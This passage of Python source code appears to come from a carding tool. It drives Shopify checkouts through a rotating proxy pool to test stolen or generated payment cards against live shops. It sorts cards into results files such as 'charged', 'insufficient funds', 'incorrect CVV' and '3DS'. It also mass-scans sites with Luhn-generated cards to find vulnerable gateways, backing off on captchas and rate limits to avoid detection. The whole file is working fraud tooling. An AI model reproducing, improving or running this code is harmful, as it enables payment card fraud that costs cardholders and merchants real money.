                if err_amt and err_cur and (
                    err_amt != submit_params["total_amount"] or
                    err_cur != submit_params["currency"]
                ):
                    try:
                        _sent = float(submit_params["total_amount"])
                        _got = float(err_amt)
                    except (ValueError, TypeError):
                        _sent = _got = 0.0
                    if _sent > 0 and _got < _sent * 0.5:
                        eyelifter_dbg(
                            "SUBMIT",
                            f"refusing retry: got {_got} (src={err_src}), sent {_sent} — server reset state",
                        )
                        break
                    if _got <= 0.01:
                        eyelifter_dbg(
                            "SUBMIT",
                            f"refusing retry: got {_got} ≤ 0.01 (src={err_src})",
                        )
                        break
                    eyelifter_dbg(
                        "SUBMIT",
                        f"mismatch retry: {submit_params['total_amount']} "
                        f"{submit_params['currency']} -> {err_amt} {err_cur} "
                        f"(src={err_src})",
                    )
                    _mm_repoll_updated = False
                    try:
                        _mm_qt = eyelifter_scrape_queue_token(p4) or submit_params["queue_token"]
                        _, p4_mm = eyelifter_send_proposal(
                            client, checkout_url, checkout_token, session_token,
                            stable_id, variant_id, build_id, source_token,
                            _mm_qt, email, addr, submit_params["currency"],
                            submit_params["country"], "address",
                        )
                        p4 = eyelifter_wait_for_final_p4(
                            client, checkout_url, checkout_token, session_token,
                            stable_id, variant_id, build_id, source_token,
                            _mm_qt, email, addr, submit_params["currency"],
                            submit_params["country"], p4_mm, max_polls=10,
                        )
                        _mm_qt2 = eyelifter_scrape_queue_token(p4)
                        if _mm_qt2:
                            submit_params["queue_token"] = _mm_qt2
                        _mm_pt = eyelifter_scrape_payment_terms_id(p4)
                        if _mm_pt:
                            submit_params["payment_terms_id"] = _mm_pt
                        _mm_dh = eyelifter_scrape_delivery_handle(p4)
                        if _mm_dh:
                            submit_params["delivery_handle"] = _mm_dh
                        _mm_sh = eyelifter_scrape_signed_handles(p4)
                        if _mm_sh:
                            submit_params["signed_handles"] = _mm_sh
                        _mm_ck = eyelifter_scrape_checkpoint(p4)
                        if _mm_ck:
                            submit_params["checkpoint_data"] = _mm_ck
                        _mm_tax = eyelifter_scrape_tax(p4)
                        if _mm_tax:
                            submit_params["tax_amount"] = _mm_tax
                        _mm_amt, _mm_cur, _mm_src = eyelifter_resolve_price(p4)
                        if _mm_amt and _mm_cur:
                            try:
                                if float(_mm_amt) > 0.01:
                                    submit_params["total_amount"] = _mm_amt
                                    submit_params["currency"] = _mm_cur
                                    _mm_repoll_updated = True
                            except (ValueError, TypeError):
                                pass
                    except Exception as _mmex:
                        eyelifter_dbg(
                            "SUBMIT",
                            f"amount-mismatch re-poll crashed: {type(_mmex).__name__}: {str(_mmex)[:60]}",
                        )
                    if not _mm_repoll_updated:
                        submit_params["total_amount"] = err_amt
                        submit_params["currency"] = err_cur
                    totals = eyelifter_extract_totals_from_error(submit_body)
                    if "tax" in totals and not submit_params.get("tax_amount"):
                        submit_params["tax_amount"] = totals["tax"]["amount"]
                    continue

            if (
                "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body or
                "A_NEW_TAX_LINE" in submit_body
            ):
                totals = eyelifter_extract_totals_from_error(submit_body)
                if "tax" in totals:
                    submit_params["tax_amount"] = totals["tax"]["amount"]
                if "checkoutTotal" in totals:
                    submit_params["total_amount"] = totals["checkoutTotal"]["amount"]
                    submit_params["currency"] = totals["checkoutTotal"]["currencyCode"]
                continue

            if (
                "NO_AVAILABLE_DELIVERY_STRATEGY_FOUND" in submit_body or
                "no delivery strategy" in submit_body.lower()
            ):
                if not is_digital and not digital_retry:
                    _old_handle = submit_params.get("delivery_handle") or ""
                    eyelifter_dbg(
                        "SUBMIT",
                        f"no delivery strategy — re-polling P4 (old handle={_old_handle[:16]})",
                    )
                    try:
                        _repoll_qt = eyelifter_scrape_queue_token(p4) or submit_params["queue_token"]
                        _, p4_repoll = eyelifter_send_proposal(
                            client, checkout_url, checkout_token, session_token,
                            stable_id, variant_id, build_id, source_token,
                            _repoll_qt, email, addr, submit_params["currency"],
                            submit_params["country"], "address",
                        )
                        p4 = eyelifter_wait_for_final_p4(
                            client, checkout_url, checkout_token, session_token,
                            stable_id, variant_id, build_id, source_token,
                            _repoll_qt, email, addr, submit_params["currency"],
                            submit_params["country"], p4_repoll, max_polls=10,
                        )
                        _new_qt = eyelifter_scrape_queue_token(p4)
                        if _new_qt:
                            submit_params["queue_token"] = _new_qt
                        _new_dh = eyelifter_scrape_delivery_handle(p4)
                        _new_sh = eyelifter_scrape_signed_handles(p4)
                        _new_pt = eyelifter_scrape_payment_terms_id(p4)
                        _amt3, _cur3, _src3 = eyelifter_resolve_price(p4)
                        _handle_changed = (_new_dh and _new_dh != _old_handle)

                        if _new_dh:
                            submit_params["delivery_handle"] = _new_dh
                        if _new_sh:
                            submit_params["signed_handles"] = _new_sh
                        if _new_pt:
                            submit_params["payment_terms_id"] = _new_pt
                        if _amt3 and _cur3:
                            try:
                                if float(_amt3) > 0.01:
                                    submit_params["total_amount"] = _amt3
                                    submit_params["currency"] = _cur3
                            except (ValueError, TypeError):
                                pass
                        _tax3 = eyelifter_scrape_tax(p4)
                        if _tax3:
                            submit_params["tax_amount"] = _tax3

                        if _handle_changed:
                            eyelifter_dbg(
                                "SUBMIT",
                                f"handle refreshed {_old_handle[:16]} -> {_new_dh[:16]} — retrying SHIPPING",
                            )
                            time.sleep(0.6)
                            continue
                    except Exception as _rex:
                        eyelifter_dbg(
                            "SUBMIT",
                            f"re-poll crashed: {type(_rex).__name__}: {str(_rex)[:60]}",
                        )

                if not digital_retry:
                    eyelifter_dbg("SUBMIT", "handle unchanged — falling back to digital retry")
                    is_digital = True
                    submit_params["is_digital"] = True
                    submit_params["delivery_handle"] = ""
                    digital_retry = True
                    continue

            break

        receipt_id = eyelifter_scrape_receipt_id(submit_body)
        if not receipt_id:
            err = eyelifter_map_error(submit_body) or "SUBMIT_REJECTED"
            result["verdict"] = eyelifter_classify_code(err)
            result["code"] = err
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        receipt_token = eyelifter_scrape_receipt_token(submit_body)
        if not receipt_token:
            result["code"] = "NO_RECEIPT_TOKEN"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        delay = 0.4
        m = re.search(r'"pollDelay"\s*:\s*(\d+)', submit_body)
        if m:
            delay = max(0.4, int(m.group(1)) / 1000.0)

        state = None
        final_receipt = None

        for _ in range(1, 21):
            if eyelifter_STOP.is_set():
                break
            status, body = eyelifter_send_poll(
                client,
                checkout_url,
                checkout_token,
                session_token,
                build_id,
                source_token,
                receipt_id,
                receipt_token,
            )
            if status != 200:
                time.sleep(delay)
                continue
            if "WaitingReceipt" in body:
                time.sleep(2.0)
                continue
            try:
                j = json.loads(body)
            except Exception:
                time.sleep(delay)
                continue
            recpt = eyelifter_dig(j, "data", "receipt") or {}
            typename = recpt.get("__typename") or ""
            if typename in eyelifter_TERMINAL:
                state = eyelifter_TERMINAL[typename]
                final_receipt = recpt
                break
            time.sleep(delay)

        result["elapsed"] = round(time.monotonic() - start, 1)

        if not state:
            result["verdict"] = "TIMEOUT"
            result["code"] = "POLL_TIMEOUT"
            return result

        if state == "COMPLETED":
            result["verdict"] = "COMPLETED"
            result["code"] = "ORDER_PLACED"
        elif state == "FAILED":
            err = final_receipt.get("processingError") or {}
            err_type = err.get("__typename") or ""
            code = err.get("code") or ""
            if err_type == "PaymentFailed":
                if "CAPTCHA" in (code or "").upper():
                    result["verdict"] = "CAPTCHA"
                    result["code"] = "CAPTCHA_REQUIRED"
                else:
                    result["verdict"] = eyelifter_classify_code(code or "PAYMENT_FAILED")
                    result["code"] = code or "PAYMENT_FAILED"
            elif code:
                result["verdict"] = eyelifter_classify_code(code)
                result["code"] = code
            else:
                result["verdict"] = "FAILED"
                result["code"] = err_type or "FAILED"
        elif state == "ACTION_REQUIRED":
            result["verdict"] = "3DS"
            result["code"] = "ACTION_REQUIRED"
        elif state in ("CANCELLED", "EXPIRED"):
            result["verdict"] = state
            result["code"] = state
        else:
            result["verdict"] = state
            result["code"] = "UNKNOWN"

        return result

    except eyelifter_Stopped:
        result["verdict"] = "ERROR"
        result["code"] = "STOPPED"
        result["elapsed"] = round(time.monotonic() - start, 1)
        return result

    except Exception as e:
        result["code"] = f"{type(e).__name__}: {str(e)[:60]}"
        result["elapsed"] = round(time.monotonic() - start, 1)
        return result

    finally:
        client.eyelifter_close()


def eyelifter_is_retryable(result):
    if not isinstance(result, dict):
        return True
    v = (result.get("verdict") or "").upper()
    c = (result.get("code") or "").upper()

    if v == "COMPLETED":
        return False
    if v == "3DS":
        return False
    if v == "DECLINED":
        return False
    if v == "DEAD_CARD":
        return False
    if v.startswith("APPROVED"):
        return False
    if v == "CANCELLED":
        return False
    if v == "EXPIRED":
        return False
    if v == "LOGIN_REQUIRED":
        return False
    if v == "OUT_OF_RANGE":
        return False
    if c == "NOT_SHOPIFY":
        return False
    if c == "OUT_OF_RANGE":
        return False
    if c == "ALL_COUNTRIES_EXHAUSTED":
        return False
    if c in (
        "NO_DELIVERY",
        "NO_DELIVERY_HANDLE",
        "NO_AVAILABLE_DELIVERY_STRATEGY_FOUND",
    ):
        return True

    return True


def eyelifter_classify_proxy_error_local(r):
    code = r.get("code") or ""
    up = code.upper()

    if "429" in up or "RATE_LIMIT" in up:
        return "cool"
    if "403" in up or "FORBIDDEN" in up or "BLOCKED" in up:
        return "bad"
    if "PCI_HTTP_" in up:
        return "bad"
    if "NO_IDENT_SIG" in up:
        return "cool"
    if "NO_PRODUCTS_FROM_ANY" in up:
        return "cool"

    for name in eyelifter_TRANSPORT_ERRORS:
        if name.lower() in code.lower():
            return "bad"

    if "FAILED_TO_CONNECT" in up or "CONNECTIONERROR" in up:
        return "bad"

    return None

def eyelifter_record_stats(result):
    with eyelifter_LK:
        eyelifter_ST["checked"] += 1
        v = result.get("verdict", "ERROR")
        if v in eyelifter_ST:
            eyelifter_ST[v] += 1
        else:
            eyelifter_ST["ERROR"] += 1


def eyelifter_record_proxy_state(result, proxy):
    if not proxy:
        return
    hint = eyelifter_classify_proxy_error_local(result)

    if hint == "cool":
        eyelifter_cool_proxy(proxy, 300)
    elif hint == "bad":
        eyelifter_bad_proxy(proxy)
    elif result.get("verdict") in ("CAPTCHA", "CAPTCHA_PROPOSAL", "RISK_BLOCKED"):
        eyelifter_cool_proxy(proxy, 120)
    elif eyelifter_is_retryable(result):
        eyelifter_cool_proxy(proxy, 180)


def eyelifter_check_site_retry(shop_url, card_entry,
                                 min_price=None, max_price=None,
                                 fixed_country=None, max_retries=None):
    # Fix D: track per-country delivery failures; only skip after two.
    # The counters and skip set are local to this call, so they are reset
    # automatically for each fresh check_site_retry invocation.
    if max_retries is None:
        max_retries = eyelifter_CFG.s.get("check_retries", 2)

    max_retries = max(1, int(max_retries))
    _DELIVERY_CODES = (
        "NO_DELIVERY",
        "NO_DELIVERY_HANDLE",
        "NO_AVAILABLE_DELIVERY_STRATEGY_FOUND",
    )
    _delivery_bonus = max_retries
    _delivery_used = 0

    last_result = None
    last_proxy = None
    skip_countries = set()
    delivery_fails = {}

    attempt = 0
    max_attempts = max_retries

    while attempt < max_attempts:
        attempt += 1
        if eyelifter_STOP.is_set():
            break

        eyelifter_rl_wait()
        proxy = (
            eyelifter_pick_proxy(exclude=last_proxy)
            if eyelifter_PROXY_POOL
            else None
        )

        if attempt == 1:
            if proxy:
                eyelifter_dbg("PROXY", proxy)
        else:
            eyelifter_dbg("PROXY", f"{proxy or 'direct'} (retry {attempt - 1})")

        try:
            result = eyelifter_check_site(
                shop_url,
                card_entry,
                proxy or "",
                min_price=min_price,
                max_price=max_price,
                fixed_country=fixed_country,
                skip_countries=skip_countries,
            )
        except Exception as e:
            result = eyelifter_result_template(shop_url)
            result["code"] = f"{type(e).__name__}: {str(e)[:60]}"
        finally:
            if proxy:
                eyelifter_rel_proxy(proxy)

        last_result = result
        last_proxy = proxy

        eyelifter_record_proxy_state(result, proxy)

        _code_up = (result.get("code") or "").upper()
        if _code_up in _DELIVERY_CODES:
            _failed_c = (result.get("country") or "").strip()
            if _failed_c:
                delivery_fails[_failed_c] = delivery_fails.get(_failed_c, 0) + 1
                if delivery_fails[_failed_c] >= 2:
                    skip_countries.add(_failed_c)
                    eyelifter_dbg(
                        "RETRY",
                        f"skip {_failed_c} after {delivery_fails[_failed_c]} "
                        f"delivery failures",
                    )
            if _delivery_used < _delivery_bonus:
                _delivery_used += 1
                max_attempts = max_retries + _delivery_used
                eyelifter_dbg(
                    "RETRY",
                    f"delivery ({_code_up}) on {_failed_c or '?'} — "
                    f"extra attempt {_delivery_used}/{_delivery_bonus}, "
                    f"skipping={','.join(sorted(skip_countries)) or 'none'}",
                )

        if not eyelifter_is_retryable(result):
            eyelifter_record_stats(result)
            return result

        if attempt < max_attempts and not eyelifter_STOP.is_set():
            netloc = urllib.parse.urlparse(shop_url).netloc or shop_url
            eyelifter_dbg(
                "RETRY",
                f"{netloc} | {result.get('verdict', '?')}/"
                f"{str(result.get('code', ''))[:30]} | "
                f"attempt {attempt}/{max_attempts}",
            )
            time.sleep(0.4 + random.uniform(0, 0.6))

    if last_result is None:
        last_result = eyelifter_result_template(shop_url)
        last_result["code"] = "STOPPED"

    eyelifter_record_stats(last_result)
    return last_result


def eyelifter_short_line(r):
    cc = r.get("card_masked", "")
    domain = r.get("domain", "")
    v = r["verdict"]
    amount = r.get("amount", "") or ""
    currency = r.get("currency", "") or ""
    amt_str = f"{amount} {currency}".strip()
    parts = [domain, cc, v]
    if amt_str:
        parts.append(amt_str)
    parts.append(r["code"])
    return " | ".join(parts)


def eyelifter_print_result(r, index=None, total=None):
    if index is not None and total is not None:
        eyelifter_rline(index, total, r["verdict"], eyelifter_short_line(r))
        return

    code, bold = eyelifter_KIND_COLOR.get(r["verdict"], ("0", False))
    print(f"  {eyelifter_c(code, r['verdict'], bold)}  |  {r['code']}")
    print(f"  domain:    {r['domain']}")
    print(f"  card:      {r['card_masked']}")
    print(f"  gateway:   {r.get('gateway') or 'Unknown'}")

    if r["amount"]:
        print(f"  amount:    {r['amount']} {r['currency']}")
    if r["product_title"]:
        print(f"  product:   {r['product_title'][:70]}")
    if r["variant_id"]:
        print(f"  variant:   {r['variant_id']}")

    print(f"  elapsed:   {r['elapsed']}s")


def eyelifter_write_hit(r):
    v = r["verdict"]

    code_up = (r.get("code") or "").upper()
    fn = "shopify_errors.txt"
    if v == "COMPLETED":
        fn = "shopify_charged.txt"
    elif v == "3DS":
        fn = "shopify_3ds.txt"
    elif v == "Approved (Insufficient Funds)":
        fn = "shopify_insufficient_funds.txt"
    elif v == "Approved (CVC)":
        fn = "shopify_incorrect_cvv.txt"
    elif v == "Approved (AVS)":
        fn = "shopify_avs.txt"
    elif code_up in (
        "NO_DELIVERY",
        "NO_DELIVERY_HANDLE",
        "NO_AVAILABLE_DELIVERY_STRATEGY_FOUND",
        "ALL_COUNTRIES_EXHAUSTED",
        "SHIPPING_ADDRESS_UNDELIVERABLE",
    ):
        fn = "shopify_no_delivery.txt"
    elif v in ("DECLINED", "DEAD_CARD", "FAILED", "CANCELLED", "EXPIRED"):
        fn = "shopify_dead.txt"
    elif v in ("CAPTCHA", "CAPTCHA_PROPOSAL", "RISK_BLOCKED"):
        fn = "shopify_captcha.txt"
    elif v == "OUT_OF_RANGE":
        fn = "shopify_out_of_range.txt"

    gw = r.get("gateway") or "Unknown"
    line = (
        f"{r['card_masked']} | {r['url']} | {v} | {r['code']} | "
        f"{r['amount']} {r['currency']} | {gw} | {eyelifter_LINE_TAG}\n"
    )

    eyelifter_safe_append(fn, line)
    try:
        eyelifter_safe_append(
            "shopify_results.jsonl",
            json.dumps({**r, "credit": eyelifter_LINE_TAG}, ensure_ascii=False) + "\n",
        )
    except Exception:
        pass


def eyelifter_normalize_url(u):
    if not isinstance(u, str):
        return ""
    u = u.replace("\xa0", " ").strip()
    if not u or " " in u or "." not in u:
        return ""
    if "://" not in u:
        u = "https://" + u
    try:
        p = urllib.parse.urlparse(u)
    except Exception:
        return ""
    host = (p.hostname or "").strip().lower().rstrip(".")
    if not host:
        return ""
    if host.startswith("www."):
        host = host[4:]
    if not host or "." not in host:
        return ""
    return f"https://{host}"


def eyelifter_luhn_complete(prefix):
    body = prefix
    while len(body) < 15:
        body += str(random.randint(0, 9))
    digits = [int(x) for x in body]
    parity = (len(body) + 1) % 2
    total = 0
    for i, d in enumerate(digits):
        if i % 2 == parity:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    check = (10 - (total % 10)) % 10
    return body + str(check)


def eyelifter_gen_test_card():
    prefix = random.choice(["4", "51", "52", "53", "54", "55"])
    num = eyelifter_luhn_complete(prefix)
    now = datetime.now()
    exp_year = now.year + random.randint(1, 3)
    exp_month = random.randint(1, 12)
    cvv = f"{random.randint(0, 999):03d}"
    return f"{num}|{exp_month:02d}|{exp_year}|{cvv}"


def eyelifter_is_shopify_gateway(gw):
    if not gw:
        return False
    low = gw.lower()
    return any(a in low for a in ("shopify payments", "shopify", "shopify_payments"))


def eyelifter_simplify_site(s):
    return {
        "url": s["site"],
        "price": s["price"],
        "detail": s.get("detail", ""),
        "verdict": s.get("raw_message", ""),
    }


def eyelifter_export_site_results(alive_list, folder):
    os.makedirs(folder, exist_ok=True)

    def eyelifter_export_dump(name, data):
        try:
            with open(os.path.join(folder, name), "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            eyelifter_log("✗", "ERROR", "EXPORT", f"{name}: {e}")

    shopify_sites = [s for s in alive_list if eyelifter_is_shopify_gateway(s["gateway"])]
    other_sites = [s for s in alive_list if not eyelifter_is_shopify_gateway(s["gateway"])]

    ranges = {
        "0.01-0.5": [],
        "0.5-10": [],
        "10-20": [],
        "20-30": [],
        "30+": [],
    }
    for s in shopify_sites:
        p = s["price"]
        simp = eyelifter_simplify_site(s)
        if p < 0.5:
            ranges["0.01-0.5"].append(simp)
        elif p < 10.0:
            ranges["0.5-10"].append(simp)
        elif p < 20.0:
            ranges["10-20"].append(simp)
        elif p < 30.0:
            ranges["20-30"].append(simp)
        else:
            ranges["30+"].append(simp)

    eyelifter_export_dump("sites_0.01_to_0.5.json", ranges["0.01-0.5"])
    eyelifter_export_dump("sites_0.5_to_10.json", ranges["0.5-10"])
    eyelifter_export_dump("sites_10_to_20.json", ranges["10-20"])
    eyelifter_export_dump("sites_20_to_30.json", ranges["20-30"])
    eyelifter_export_dump("sites_30_plus.json", ranges["30+"])
    eyelifter_export_dump("sites_alive.json", [eyelifter_simplify_site(s) for s in shopify_sites])
    eyelifter_export_dump("sites_shopify_only.json", [eyelifter_simplify_site(s) for s in shopify_sites])

    groups = {}
    for s in other_sites:
        gw = re.sub(r"[^A-Za-z0-9_]", "_", s["gateway"]) or "Unknown"
        groups.setdefault(gw, []).append(eyelifter_simplify_site(s))

    for gw, data in groups.items():
        eyelifter_export_dump(f"sites_gateway_{gw}.json", data)

    eyelifter_export_dump("sites.json", [eyelifter_simplify_site(s) for s in alive_list])
    eyelifter_log("✓", "INFO", "EXPORT", f"shopify={len(shopify_sites)} other={len(other_sites)}")


def eyelifter_probe_site_alive(site, max_attempts=2):
    site = eyelifter_normalize_url(site)
    if not site:
        return {
            "site": "",
            "domain": "",
            "status": "error",
            "price": 0.0,
            "currency": "USD",
            "gateway": "Unknown",
            "detail": "invalid_url",
            "raw_message": "",
            "elapsed": 0.0,
            "card": "",
        }

    last = None
    for _ in range(max_attempts):
        card = eyelifter_gen_test_card()
        try:
            r = eyelifter_check_site_retry(
                site,
                card,
                min_price=0.01,
                max_price=1000000.0,
                fixed_country=None,
                max_retries=1,
            )
        except Exception as e:
            r = eyelifter_result_template(site)
            r["code"] = f"{type(e).__name__}: {str(e)[:60]}"

        status, detail, gateway = eyelifter_classify_probe(r)

        last = {
            "site": site,
            "domain": r.get("domain", ""),
            "status": status,
            "price": float(r.get("amount") or 0.0),
            "currency": r.get("currency", "USD"),
            "gateway": gateway,
            "detail": detail,
            "raw_message": (r.get("code") or "")[:100],
            "elapsed": r.get("elapsed", 0.0),
            "card": card,
        }

        if status == "alive":
            return last

        code_lower = (r.get("code") or "").lower()
        retryable_markers = (
            tuple(t.lower() for t in eyelifter_TRANSPORT_ERRORS)
            + tuple(c.lower() for c in eyelifter_RETRY_CODES)
            + (
                "no products from any",
                "checkout_load_failed",
                "submit_rejected",
                "amount_mismatch",
                "cart_http_429",
                "cart_http_403",
                "cart_failed",
                "pci_http_",
                "no_payment_method",
                "no_delivery_handle",
                "no_delivery",
                "no_ident_sig",
                "no_checkout_total",
                "currency_mismatch",
                "pending_terms",
                "payment_terms_mismatch",
                "proposal_1_failed",
                "proposal_2_failed",
            )
        )
        if not any(t in code_lower for t in retryable_markers):
            return last

    return last


def eyelifter_mass_sites_alive_run(proxies):
    global eyelifter_TOTAL
    eyelifter_section("MASS SITES (alive only)")

    path = input(f"{eyelifter_c('96', '[*] sites file (JSON or 1-per-line) > ')}").strip()
    urls = eyelifter_load_sites_file(path)

    if not urls:
        eyelifter_log("✗", "ERROR", "INPUT", "no valid sites")
        return

    eyelifter_log("✓", "INFO", "INPUT", f"{len(urls)} unique sites")

    threads = eyelifter_ask_int("threads", eyelifter_CFG.s.get("threads", 8), 1, eyelifter_MAX_THREADS)
    eyelifter_CFG.s["threads"] = threads
    eyelifter_CFG.eyelifter_save()

    if proxies and not eyelifter_PROXY_POOL:
        eyelifter_PROXY_POOL.extend(proxies)

    if not eyelifter_PROXY_POOL:
        eyelifter_log("⚠️", "WARN", "DIRECT", f"no proxies → running direct at {threads} threads")

    eyelifter_reset_stats()
    eyelifter_TOTAL = len(urls)
    folder = eyelifter_ensure_folder()

    eyelifter_log("🚀", "INFO", "START", f"{eyelifter_TOTAL} sites · {threads} threads")

    stats = {"alive": 0, "dead": 0, "error": 0, "shopify": 0, "other": 0}
    reasons = {"dead": {}, "error": {}}
    stats_lock = threading.Lock()
    alive_list = []

    def eyelifter_alive_worker(site_url):
        if eyelifter_STOP.is_set():
            return
        delay = eyelifter_CFG.s.get("combo_delay", 0.3)
        if delay > 0 and eyelifter_STOP.wait(delay * (0.5 + random.random())):
            return

        eyelifter_rl_wait()
        if eyelifter_STOP.is_set():
            return

        res = eyelifter_probe_site_alive(site_url, max_attempts=3)

        if eyelifter_STOP.is_set():
            return

        with stats_lock:
            st = res["status"]
            if st == "alive":
                stats["alive"] += 1
                if eyelifter_is_shopify_gateway(res["gateway"]):
                    stats["shopify"] += 1
                else:
                    stats["other"] += 1
            elif st == "dead":
                stats["dead"] += 1
                reasons["dead"][res["detail"]] = reasons["dead"].get(res["detail"], 0) + 1
            else:
                stats["error"] += 1
                reasons["error"][res["detail"]] = reasons["error"].get(res["detail"], 0) + 1

        done_total = stats["alive"] + stats["dead"] + stats["error"]

        if st == "alive":
            eyelifter_rline(
                done_total,
                eyelifter_TOTAL,
                "COMPLETED",
                f"{res['domain']} | {res.get('gateway') or 'Unknown'} | ${res['price']:.2f} | {res['detail']}",
            )
            alive_list.append(res)
            detail_str = res["detail"]
            card_str = res.get("card", "") or "n/a"
            line = (
                f"{res['domain']} | ${res['price']:.2f} | "
                f"{res['detail']} | {res.get('gateway') or 'Unknown'} | {card_str}\n"
            )

            if "3DS" in detail_str:
                eyelifter_safe_append("sites_3ds.txt", line)
                eyelifter_safe_append("sites_useful.txt", line)
            elif "Charged" in detail_str:
                eyelifter_safe_append("sites_charged.txt", line)
                eyelifter_safe_append("sites_useful.txt", line)
            elif "Insufficient" in detail_str:
                eyelifter_safe_append("sites_insufficient_funds.txt", line)
                eyelifter_safe_append("sites_useful.txt", line)
            elif "CVC" in detail_str or "CVV" in detail_str:
                eyelifter_safe_append("sites_incorrect_cvv.txt", line)
                eyelifter_safe_append("sites_useful.txt", line)
            elif "AVS" in detail_str:
                eyelifter_safe_append("sites_avs.txt", line)
                eyelifter_safe_append("sites_useful.txt", line)
            elif "Declined" in detail_str:
                eyelifter_safe_append("sites_declined.txt", line)
            elif "Captcha" in detail_str:
                eyelifter_safe_append("sites_captcha.txt", line)

            eyelifter_safe_append("sites_alive.txt", line)

            gw = res.get("gateway") or ""
            if eyelifter_is_shopify_gateway(gw):
                eyelifter_safe_append("sites_shopify.txt", line)
            else:
                safe_gw = re.sub(r"[^A-Za-z0-9_]", "_", gw or "Unknown") or "Unknown"
                eyelifter_safe_append(f"sites_gateway_{safe_gw}.txt", line)

        elif st == "dead":
            eyelifter_rline(
                done_total,
                eyelifter_TOTAL,
                "DEAD_CARD",
                f"{res['domain']} | DEAD | {res['detail']}",
            )
        else:
            eyelifter_rline(
                done_total,
                eyelifter_TOTAL,
                "ERROR",
                f"{res['domain']} | ERR | {res['detail']}",
            )

    ex = ThreadPoolExecutor(max_workers=threads)
    inflight = set()
    cap = max(threads * 4, 200)

    try:
        for i in range(0, len(urls), cap):
            if eyelifter_STOP.is_set():
                break
            for u in urls[i:i + cap]:
                if eyelifter_STOP.is_set():
                    break
                inflight.add(ex.submit(eyelifter_alive_worker, u))

            while len(inflight) >= cap:
                done, inflight = wait(inflight, timeout=0.4, return_when=FIRST_COMPLETED)
                for f in done:
                    try:
                        f.result(timeout=0.01)
                    except Exception:
                        pass

        while inflight:
            done, inflight = wait(inflight, timeout=0.4, return_when=FIRST_COMPLETED)
            for f in done:
                try:
                    f.result(timeout=0.01)
                except Exception:
                    pass

    except KeyboardInterrupt:
        eyelifter_STOP.set()
        eyelifter_log("🛑", "WARN", "STOP", "stopping...")
    finally:
        for f in inflight:
            f.cancel()
        _drain_end = time.monotonic() + 5.0
        while inflight and time.monotonic() < _drain_end:
            done, inflight = wait(inflight, timeout=0.5, return_when=FIRST_COMPLETED)
            for f in done:
                if f.cancelled():
                    continue
                try:
                    f.result(timeout=0.01)
                except BaseException:
                    pass
        ex.shutdown(wait=False, cancel_futures=True)

    try:
        with stats_lock:
            snapshot = list(alive_list)
        eyelifter_export_site_results(snapshot, folder)
        eyelifter_log("✓", "INFO", "SAVE", folder)
    except Exception as e:
        eyelifter_log("✗", "ERROR", "SAVE", f"{e}")

    eyelifter_flush_writes()
    counts = eyelifter_rename_by_count(folder)
    eyelifter_log_counts(counts)

    eyelifter_summary([
        ("Total", eyelifter_TOTAL),
        ("Alive", stats["alive"]),
        ("  Shopify", stats["shopify"]),
        ("  Other", stats["other"]),
        ("Dead", stats["dead"]),
        ("Errors", stats["error"]),
        ("Folder", folder),
        ("Credit", eyelifter_LINE_TAG),
    ])

    if reasons["dead"]:
        print()
        print(eyelifter_c("96", "Dead reasons:", True))
        for k, v in sorted(reasons["dead"].items(), key=lambda x: -x[1])[:10]:
            print(f"  {v:>4}  {k[:80]}")

    if reasons["error"]:
        print()
        print(eyelifter_c("96", "Error reasons:", True))
        for k, v in sorted(reasons["error"].items(), key=lambda x: -x[1])[:10]:
            print(f"  {v:>4}  {k[:80]}")


def eyelifter_single_card_run(proxies):
    eyelifter_section("SINGLE CARD")
    default = eyelifter_CFG.s.get("default_site", "").strip()
    hint = f" ({default})" if default else ""
    raw = input(f"{eyelifter_c('96', f'[*] site URL{hint} > ')}").strip()
    site = eyelifter_normalize_url(raw) if raw else eyelifter_normalize_url(default)
    if not site:
        return

    card = input(f"{eyelifter_c('96', '[*] card (CC|MM|YYYY|CVV) > ')}").strip()
    if not card:
        return

    try:
        parsed = eyelifter_parse_card(card)
        if not eyelifter_luhn_check(parsed["number"]):
            eyelifter_log("✗", "ERROR", "LUHN", "card failed Luhn check — aborting")
            return
        eyelifter_log("✓", "INFO", "LUHN", "card passed Luhn")
    except Exception as e:
        eyelifter_log("✗", "ERROR", "CARD", f"parse failed: {e}")
        return

    country = input(f"{eyelifter_c('96', '[*] country (blank=auto) > ')}").strip().upper() or None

    eyelifter_reset_stats()
    if proxies and not eyelifter_PROXY_POOL:
        eyelifter_PROXY_POOL.extend(proxies)

    eyelifter_log("🔍", "STEP", "CARD", site)
    r = eyelifter_check_site_retry(
        site,
        card,
        min_price=eyelifter_CFG.s.get("min_price", 0.10),
        max_price=eyelifter_CFG.s.get("max_price", 100.0),
        fixed_country=country,
    )

    eyelifter_section("RESULT")
    eyelifter_print_result(r)
    eyelifter_write_hit(r)
    eyelifter_flush_writes()


def eyelifter_single_site_run(proxies):
    eyelifter_section("SINGLE SITE")
    default = eyelifter_CFG.s.get("default_site", "").strip()
    hint = f" ({default})" if default else ""
    raw = input(f"{eyelifter_c('96', f'[*] site URL{hint} > ')}").strip()
    site = eyelifter_normalize_url(raw) if raw else eyelifter_normalize_url(default)
    if not site:
        return

    card = eyelifter_CFG.s.get("card", "").strip()
    if not card:
        card = input(f"{eyelifter_c('96', '[*] card (CC|MM|YYYY|CVV) > ')}").strip()
        if not card:
            return
        eyelifter_CFG.s["card"] = card
        eyelifter_CFG.eyelifter_save()

    try:
        parsed = eyelifter_parse_card(card)
        if not eyelifter_luhn_check(parsed["number"]):
            eyelifter_log("✗", "ERROR", "LUHN", "default card failed Luhn — aborting")
            return
    except Exception as e:
        eyelifter_log("✗", "ERROR", "CARD", f"parse failed: {e}")
        return

    country = eyelifter_CFG.s.get("country", "").strip() or None

    use_proxy = input(f"{eyelifter_c('96', '[*] use proxy? [y/N] > ')}").strip().lower() == "y"

    eyelifter_reset_stats()
    if proxies and not eyelifter_PROXY_POOL:
        eyelifter_PROXY_POOL.extend(proxies)

    if not use_proxy and eyelifter_PROXY_POOL:
        eyelifter_PROXY_POOL.clear()
        eyelifter_log("⚠️", "WARN", "PROXY", "Proxy pool cleared for this run")

    eyelifter_log("🔍", "STEP", "SITE", site)
    r = eyelifter_check_site_retry(
        site,
        card,
        min_price=eyelifter_CFG.s.get("min_price", 0.10),
        max_price=eyelifter_CFG.s.get("max_price", 100.0),
        fixed_country=country,
    )

    eyelifter_section("RESULT")
    eyelifter_print_result(r)
